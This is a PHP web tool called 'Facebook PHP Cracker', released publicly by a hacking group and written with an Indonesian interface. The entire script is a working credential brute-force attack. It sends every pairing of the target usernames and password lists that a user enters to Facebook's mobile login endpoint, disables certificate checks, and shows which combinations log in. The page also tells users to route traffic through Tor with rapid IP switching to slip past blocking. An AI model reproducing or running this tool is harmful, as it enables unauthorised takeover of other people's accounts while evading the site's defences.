    <?php

    #################################################
    #---------------------------------------------- #
    # FB PHP - Cracker 2012                         #
    # Thanks: BinusHacker Family                    #
    # Open To Public :)                             #
    # --------------------------------------------- #
    #################################################


    ob_start();
    @set_time_limit(0);
     
    echo "
    <head>
    <title>Facebook PHP - Cracker V.1.0.2</title>
    </head>
    <body text='#FFFFFF' background='http://www.binushacker.net/wp-content/uploads/binushacker-background-digital.gif'>
    <center><a href='http://www.binushacker.net' target='_blank'><img src='http://www.binushacker.net/wp-content/uploads/binushckrlink.jpg' width='500' height='100'></a></center>
	<center><h2><font color='gray' face='Trebuchet MS'>Facebook PHP Cracker - V.1.0.2</font></h2></center>
    <center><font color='red' face='Trebuchet MS'>PERINGATAN: WAJIB Menggunakan</font> <font color='green' face='Trebuchet MS'><b><a href='http://adf.ly/313683/download-tor-browser-for-cracking' target='_blank'>TOR BROWSER</a></b> + <b>TOR SWITCHER</b></font></center>
    <center><font color='orange' face='Trebuchet MS'>Pastikan konfigurasi TOR SWITCHER: 2 Detik</font></center>
	<form method='POST'>
    <p dir='ltr' align='center'>
	<br>
	<table>
	<tr>
	<td>
	Target Username
	</td>
	<td>
	List Password
	</td>
	</tr>
	<tr>
	<td>
    <textarea cols='22' class='area'  rows='14' name='username' style='color: red; background-color: lightgreen'></textarea>
    </td>
	<td>
	<textarea cols='22' class='area'  rows='14' name='password' style='color: red; background-color: lightgreen'></textarea>
	</td>
	</tr>
	</table>
	<br>
    <input type='submit' name='hajar' value='Start Cracking'><br></p>";
    if(isset($_POST['hajar'])){
    function bantai($target,$passwd){
            $ch = curl_init();      
            curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$target}&pass={$passwd}");
            curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
            $login = curl_exec($ch);
            $check = (preg_match('/class="s t i u"/i',$login)) ? true:false;
            if($check == true){
                    echo "
					<p align='center' dir='ltr'><font face='Trebuchet MS' size='2' color='#FFFFFF'>Anda belum berhasil -> Username : <font color='red'>$target</font>&nbsp;  Password : <font color='red'>$passwd</font></font></p>";
            }else{
                    echo "
					<p align='center' dir='ltr'><font face='Trebuchet MS' size='2' color='red'>Anda berhasil, silakan dicoba -> Username: <font color='green'>$target</font>&nbsp; Password : <font color='green'>$passwd</font></font></p>";
            }
    }            
                    $targetname = explode("\n", $_POST['username']); $passwdword = explode("\n", $_POST['password']);
                      
    foreach($targetname as $targets) {
            $targets = @trim($targets);
            foreach($passwdword as $passwd) {
                    $passwd = @trim($passwd);
                    echo bantai($targets,$passwd);
            }
     
    }
    }
    echo"
    </form>
    <center><p><b><font face='Arial Black' color='#FFFFFF' size='3'>Thanks To All <a href='http://www.binushacker.net' target='_blank'>BinusHacker</a> Family</font></b></p></center>
	</body>";
    ?>